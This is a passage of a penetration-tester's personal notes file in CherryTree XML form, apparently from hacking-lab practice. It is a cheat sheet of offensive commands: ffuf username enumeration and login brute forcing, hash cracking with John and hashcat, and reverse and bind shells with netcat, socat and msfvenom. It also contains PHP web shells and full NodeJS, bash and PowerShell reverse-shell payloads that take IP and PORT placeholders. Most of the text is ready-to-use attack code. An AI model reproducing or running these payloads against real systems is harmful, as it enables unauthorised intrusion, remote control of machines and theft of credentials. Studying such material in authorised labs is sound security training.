      <rich_text indent="3" weight="heavy">ERROR_TEXT</rich_text>
      <rich_text indent="3">."</rich_text>
      <rich_text>

Fuff:
</rich_text>
      <rich_text indent="1">First check the POST request for the correct formatting</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">USERNAME:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "</rich_text>
      <rich_text indent="2" weight="heavy">HEADERS</rich_text>
      <rich_text indent="2">" -u </rich_text>
      <rich_text indent="2" weight="heavy">URL</rich_text>
      <rich_text indent="2"> -mr "</rich_text>
      <rich_text indent="2" weight="heavy">LOOKUP_MSG</rich_text>
      <rich_text indent="2">"</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">example:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.191.151/customers/signup -mr "username already exists"</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Login:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">ffuf -w </rich_text>
      <rich_text indent="2" weight="heavy">USERNAMES_FILE</rich_text>
      <rich_text indent="2">:W1,</rich_text>
      <rich_text indent="2" weight="heavy">PASSWORDS_FILE</rich_text>
      <rich_text indent="2">:W2 -X POST -d "username=W1&amp;password=W2" -H "</rich_text>
      <rich_text indent="2" weight="heavy">HEADERS</rich_text>
      <rich_text indent="2">" -u </rich_text>
      <rich_text indent="2" weight="heavy">URL</rich_text>
      <rich_text indent="2"> -fc 200</rich_text>
    </node>
    <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699881793">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Online cracking: https://crackstation.net/</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text>
Online Hash Identifier: https://hashes.com/en/tools/hash_identifier 

Offline Hash Identifier tool:
</rich_text>
      <rich_text indent="1">wget </rich_text>
      <rich_text>https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
</rich_text>
      <rich_text indent="1">python3 hash-id.py</rich_text>
      <rich_text>


John The Ripper:
</rich_text>
      <rich_text indent="1">john </rich_text>
      <rich_text indent="1" weight="heavy">HASHFILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">--wordlist=</rich_text>
      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">--format=</rich_text>
      <rich_text weight="heavy">FORMAT</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --list=formats</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">NTLM -&gt; nt</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Cracking Linux logins:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">unshadow </rich_text>
      <rich_text indent="2" weight="heavy">PASSWD_FILE</rich_text>
      <rich_text indent="2"> </rich_text>
      <rich_text indent="2" weight="heavy">SHADOW_FILE</rich_text>
      <rich_text> &gt; </rich_text>
      <rich_text weight="heavy">UNSHADOW_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --wordlist=</rich_text>
      <rich_text indent="2" weight="heavy">WORDLIST</rich_text>
      <rich_text indent="2"> --format=sha512crypt </rich_text>
      <rich_text weight="heavy">UNSHADOW_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Single-Mode:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Prepend </rich_text>
      <rich_text indent="2" weight="heavy">USERNAME</rich_text>
      <rich_text indent="2">: before the hash</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --single --format=</rich_text>
      <rich_text indent="2" weight="heavy">FORMAT</rich_text>
      <rich_text indent="2"> </rich_text>
      <rich_text weight="heavy">HASHFILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Custom rules</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">in the john.conf file</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">/etc/john/john.conf
/opt/john/john.conf</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Overview </rich_text>
      <rich_text indent="2" link="webs https://www.openwall.com/john/doc/RULES.shtml">https://www.openwall.com/john/doc/RULES.shtml</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">[List.Rules:</rich_text>
      <rich_text indent="2" weight="heavy">NAME</rich_text>
      <rich_text indent="2">]</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Regex expression</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">Example: cAz"[0-9] [!£$%@]" -&gt; capitalize first letter, append to the end a number and a symbol</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --rule=</rich_text>
      <rich_text indent="2" weight="heavy">RULE</rich_text>
      <rich_text indent="2"> HASHFILE</rich_text>
      <rich_text> --wordlist=</rich_text>
      <rich_text weight="heavy">WORDLIST</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">ZIP Files:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">zip2john </rich_text>
      <rich_text indent="2" weight="heavy">ZIP_FILE</rich_text>
      <rich_text indent="2"> &gt; </rich_text>
      <rich_text indent="2" weight="heavy">ZIP_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --wordlist=</rich_text>
      <rich_text indent="2" weight="heavy">WORDLIST</rich_text>
      <rich_text indent="2"> </rich_text>
      <rich_text weight="heavy">ZIP_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">RAR Files:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">rar2john </rich_text>
      <rich_text indent="2" weight="heavy">RAR_FILE</rich_text>
      <rich_text indent="2"> &gt; </rich_text>
      <rich_text indent="2" weight="heavy">RAR_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">john --wordlist=</rich_text>
      <rich_text indent="2" weight="heavy">WORDLIST</rich_text>
      <rich_text indent="2"> </rich_text>
      <rich_text weight="heavy">RAR_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">SSH Key</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">ssh2john </rich_text>
      <rich_text indent="2" weight="heavy">ID_RSA_PRIVATE_KEY_FILE</rich_text>
      <rich_text indent="2"> &gt; </rich_text>
      <rich_text weight="heavy">KEY_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">if not installed use -&gt; python3 /opt/ssh2john.py</rich_text>
      <rich_text> or python /usr/share/john/ssh2john.py
</rich_text>
      <rich_text indent="2">john --wordlist=</rich_text>
      <rich_text indent="2" weight="heavy">WORDLIST</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">KEY_HASH_FILE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">GPG:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">gpg2john</rich_text>
      <rich_text>





Hashcat:
</rich_text>
      <rich_text indent="1">hashcat -m </rich_text>
      <rich_text indent="1" weight="heavy">HASH_MODE</rich_text>
      <rich_text indent="1"> -a </rich_text>
      <rich_text indent="1" weight="heavy">ATTACK_TYPE</rich_text>
      <rich_text indent="1"> -o </rich_text>
      <rich_text indent="1" weight="heavy">OUTPUT_FILE</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">HASH_FILE</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">Hash_Modes -&gt; </rich_text>
      <rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
      <rich_text> 
</rich_text>
      <rich_text indent="1">Attack_Types:</rich_text>
      <rich_text> see </rich_text>
      <rich_text link="webs https://hashcat.net/wiki/">https://hashcat.net/wiki/</rich_text>
      <rich_text> 
</rich_text>
      <rich_text indent="2">0 = Wordlist</rich_text>
      <rich_text>
</rich_text>
    </node>
  </node>
  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1699551234">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
telnet</rich_text>
    <rich_text indent="1"> </rich_text>
    <rich_text indent="1" weight="heavy">IP</rich_text>
    <rich_text> </rich_text>
    <rich_text weight="heavy">PORT</rich_text>
    <rich_text>

test if system executes the commands:
</rich_text>
    <rich_text indent="1">start ping listener:
</rich_text>
    <rich_text indent="2">sudo tcpdump ip proto \\icmp -i tun0</rich_text>
    <rich_text indent="1">
execute ping:
</rich_text>
    <rich_text indent="2">.RUN ping </rich_text>
    <rich_text indent="2" weight="heavy">IP</rich_text>
    <rich_text indent="2"> -c 1</rich_text>
    <rich_text>

shell access:
</rich_text>
    <rich_text indent="1">generate revershell payload:
</rich_text>
    <rich_text indent="2">msfvenom -p cmd/unix/reverse_netcat lhost=</rich_text>
    <rich_text indent="2" weight="heavy">IP</rich_text>
    <rich_text indent="2"> lport=</rich_text>
    <rich_text indent="2" weight="heavy">PORT</rich_text>
    <rich_text indent="2"> R</rich_text>
    <rich_text indent="1">
start netcat listener</rich_text>
    <rich_text>

running executable as root with SUID bit:
</rich_text>
    <rich_text indent="1">change file owner to root:
</rich_text>
    <rich_text indent="2">sudo chown root </rich_text>
    <rich_text indent="2" weight="heavy">FILE</rich_text>
    <rich_text indent="1">
set SUID-bit:
</rich_text>
    <rich_text indent="2">sudo chmod +s </rich_text>
    <rich_text indent="2" weight="heavy">FILE</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">check with ls -l -&gt; ‘s’</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">execute file with SUID:
</rich_text>
    <rich_text indent="2">./</rich_text>
    <rich_text indent="2" weight="heavy">FILE </rich_text>
    <rich_text indent="2">-p</rich_text>
    <rich_text>

RDP:
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:</rich_text>
    <rich_text weight="heavy">IP</rich_text>
    <rich_text> /u:</rich_text>
    <rich_text weight="heavy">USERNAME</rich_text>
    <rich_text> /p:'</rich_text>
    <rich_text weight="heavy">PASSWORD</rich_text>
    <rich_text>!'</rich_text>
    <node name="Netcat" unique_id="73" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698615329" ts_lastsave="1699551280">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bind connection:
</rich_text>
      <rich_text indent="1">nc </rich_text>
      <rich_text indent="1" weight="heavy">IP PORT</rich_text>
      <rich_text> -e /bin/bash/
</rich_text>
      <rich_text indent="1">nc </rich_text>
      <rich_text indent="1" weight="heavy">IP PORT</rich_text>
      <rich_text> -e cmd.exe

listen mode:
</rich_text>
      <rich_text indent="1">nc -lvnp </rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text>

Shell Stabilisation:
</rich_text>
      <rich_text indent="1">Optimize terminal size:</rich_text>
      <rich_text>file 
</rich_text>
      <rich_text indent="2">run on local machine stty -a</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">note the rows and columns values</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">in the shell set those values</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">stty rows </rich_text>
      <rich_text indent="2" weight="heavy">NR</rich_text>
      <rich_text indent="2">
stty cols </rich_text>
      <rich_text indent="2" weight="heavy">NR</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Linux with python:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">acess target</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">python -c 'import pty;pty.spawn("/bin/bash")'</rich_text>
      <rich_text> -&gt; spawns better shell, possibly to specify python version
</rich_text>
      <rich_text indent="2">export TERM=xterm</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">background the shell wit CTRL+Z</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">stty raw -echo; fg</rich_text>
      <rich_text> -&gt; enables autocompletion, .... end re-opens the shell
</rich_text>
      <rich_text indent="2">to reset -&gt; reset</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Socat shell</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">get the socat binary to the target machine</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">wget </rich_text>
      <rich_text indent="4">https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">linux: wget </rich_text>
      <rich_text indent="2" weight="heavy">LOCAL_IP</rich_text>
      <rich_text indent="2">/socat -O /tmp/socat</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">windows: Invoke-WebRequest -uri </rich_text>
      <rich_text indent="2" weight="heavy">LOCAL_IP</rich_text>
      <rich_text indent="2">/socat.exe -outfile C:\\Windows\temp\socat.exe</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">rlwrap:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">sudo apt install rlwrap -y
rlwrap nc -lvnp </rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">for linux targets: background shell and then ‘stty raw -echo; fg’</rich_text>
      <node name="Man" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699525458" ts_lastsave="1699525478">
        <rich_text>Basic:
</rich_text>
        <rich_text indent="1">-l 	Listen mode
-p 	Specify the Port number
-n 	Numeric only; no resolution of hostnames via DNS
-v 	Verbose output (optional, yet useful to discover any bugs)
-vv 	Very Verbose (optional)
-k 	Keep listening after client disconnects</rich_text>
        <rich_text>

connect to somewhere:	nc [-options] hostname port[s] [ports] ... 

listen for inbound:	nc -l -p port [-options] [hostname] [port]

options:
</rich_text>
        <rich_text indent="1">	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-r			randomize local and remote ports
	-q secs			quit after EOF on stdin and delay of secs
	-s addr			local source address
	-T tos			set Type Of Service
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-C			Send CRLF as line-ending
	-z			zero-I/O mode [used for scanning]</rich_text>
        <rich_text>
	
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').

</rich_text>
      </node>
    </node>
    <node name="Socat" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699533283" ts_lastsave="1699551324">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat

Reverse shell:
</rich_text>
      <rich_text indent="1">Listener:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP-L:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> -</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Windows target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP:</rich_text>
      <rich_text indent="2" weight="heavy">IP</rich_text>
      <rich_text indent="2">:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> EXEC:powershell.exe,pipes</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Linux target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP:</rich_text>
      <rich_text indent="2" weight="heavy">IP</rich_text>
      <rich_text indent="2">:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> EXEC:"bash -li"</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">special stable shell:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">listener:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat TCP-L:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3"> FILE:`tty`,raw,echo=0</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">linux target:</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text indent="3">socat TCP:</rich_text>
      <rich_text indent="3" weight="heavy">IP</rich_text>
      <rich_text indent="3">:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3"> EXEC:"bash -li",pty,stderr,sigint,setsid,sane</rich_text>
      <rich_text>

Bind shell:
</rich_text>
      <rich_text indent="1">bind connection:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP:</rich_text>
      <rich_text indent="2" weight="heavy">IP</rich_text>
      <rich_text indent="2">:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> -</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Linux target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP-L:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> EXEC:"bash -li"</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Windows target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">socat TCP-L:</rich_text>
      <rich_text indent="2" weight="heavy">PORT</rich_text>
      <rich_text indent="2"> EXEC:powershell.exe,pipes</rich_text>
      <rich_text>

Encrypted shells:
</rich_text>
      <rich_text indent="1">on attacking machine generate certificate:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">reverse shell:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">listener:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3">,cert=shell.pem,verify=0 -</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">linux target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat OPENSSL:</rich_text>
      <rich_text indent="3" weight="heavy">IP</rich_text>
      <rich_text indent="3">:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3">,verify=0 EXEC:/bin/bash</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">special stable shell:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">listener:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="4">socat OPENSSL-LISTEN:</rich_text>
      <rich_text indent="4" weight="heavy">PORT</rich_text>
      <rich_text indent="4">,cert=shell.pem, FILE:`tty`,raw,echo=0</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">linux target:</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text indent="4">socat OPENSSL:</rich_text>
      <rich_text indent="4" weight="heavy">IP</rich_text>
      <rich_text indent="4">:</rich_text>
      <rich_text indent="4" weight="heavy">PORT</rich_text>
      <rich_text indent="4"> EXEC:"bash -li",pty,stderr,sigint,setsid,sane</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">bind shell:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">bind connection:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat OPENSSL:</rich_text>
      <rich_text indent="3" weight="heavy">IP</rich_text>
      <rich_text indent="3">:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3">,verify=0 -</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Windows Target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3">,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Linux target:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
      <rich_text indent="3" weight="heavy">PORT</rich_text>
      <rich_text indent="3">,cert=shell.pem,verify=0 </rich_text>
      <rich_text>EXEC:"bash -li"
</rich_text>
    </node>
    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1700228450">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Useful online tools:
</rich_text>
      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
      <rich_text>

Web-shell (PHP):
</rich_text>
      <rich_text indent="1">Identify directory of file uploads</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">create file with php command:
</rich_text>
      <rich_text indent="2">var1: &lt;?php echo system($_GET["cmd"]); ?&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">var2: &lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Navigate to the file location on browser</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2" weight="heavy">PATH_TO_UPLOADS_DIRECTORY</rich_text>
      <rich_text indent="2">/webshell.php?cmd=</rich_text>
      <rich_text indent="2" weight="heavy">COMMAND1</rich_text>
      <rich_text indent="2">;</rich_text>
      <rich_text indent="2" weight="heavy">COMMAND2</rich_text>
      <rich_text indent="2">;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">PHP Bash command execution:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">&lt;?php
$output = shell_exec('</rich_text>
      <rich_text indent="2" weight="heavy">COMMAND</rich_text>
      <rich_text indent="2">');
echo "&lt;pre&gt;$output&lt;/pre&gt;";
?&gt;</rich_text>
      <rich_text>

PHP reverse-shell:
</rich_text>
      <rich_text indent="1">Download Monkey Reverse Shell</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">edit file -&gt; change IP to own IP</rich_text>
      <rich_text> and port
</rich_text>
      <rich_text indent="2">$ip = '</rich_text>
      <rich_text indent="2" weight="heavy">127.0.0.1</rich_text>
      <rich_text indent="2">';  // CHANGE THIS</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">$port = </rich_text>
      <rich_text indent="2" weight="heavy">1234</rich_text>
      <rich_text indent="2">;       // CHANGE THIS</rich_text>
      <rich_text>

NodeJS reverse-shell:
</rich_text>
      <rich_text indent="1">shell.js</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(</rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1">, "</rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();</rich_text>
      <rich_text>

Bash reverse shell:
</rich_text>
      <rich_text indent="1">nc </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1"> -e /bin/bash</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">mkfifo /tmp/f; nc </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1"> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
      <rich_text>

Bash bind listener:
</rich_text>
      <rich_text indent="1">mkfifo /tmp/f; nc -lvnp </rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1"> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
      <rich_text>

Powershell reverse shell:
</rich_text>
      <rich_text indent="1">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('</rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">',</rich_text>
      <rich_text indent="1" weight="heavy">PORT</rich_text>
      <rich_text indent="1">);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
      <rich_text>
</rich_text>
      <node name="MSF Venom" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699449829" ts_lastsave="1699535470">
        <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
list msfvenom payloads:
</rich_text>
        <rich_text indent="1">msfvenom -l </rich_text>
        <rich_text>

list msfvenom formats:
</rich_text>
        <rich_text indent="1">msfvenom -l formats</rich_text>
        <rich_text>

list msfvenom encoders:
</rich_text>
        <rich_text indent="1">msfvenom -l </rich_text>
        <rich_text>encoders

generate payload with msfvenom:
</rich_text>
        <rich_text indent="1">msfvenom -p </rich_text>
        <rich_text indent="1" weight="heavy">PAYLOAD</rich_text>
        <rich_text indent="1"> lhost=</rich_text>
        <rich_text indent="1" weight="heavy">IP</rich_text>
        <rich_text indent="1"> lport=</rich_text>
        <rich_text indent="1" weight="heavy">PORT</rich_text>
        <rich_text indent="1"> -f </rich_text>
        <rich_text indent="1" weight="heavy">FORMAT</rich_text>
        <rich_text indent="1"> -o </rich_text>
        <rich_text weight="heavy">OUTPUT_NAME</rich_text>
        <rich_text>

Basic reverse shells:
</rich_text>
        <rich_text indent="1">Linux
</rich_text>
        <rich_text indent="2">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f elf -o rev_shell.elf</rich_text>
        <rich_text indent="1">

Windows
</rich_text>
        <rich_text indent="2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f exe -o rev_shell.exe</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">msfvenom -p windows/x64/shell/reverse_tcp LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f exe -o shell.exe </rich_text>
        <rich_text indent="1">

PHP
</rich_text>
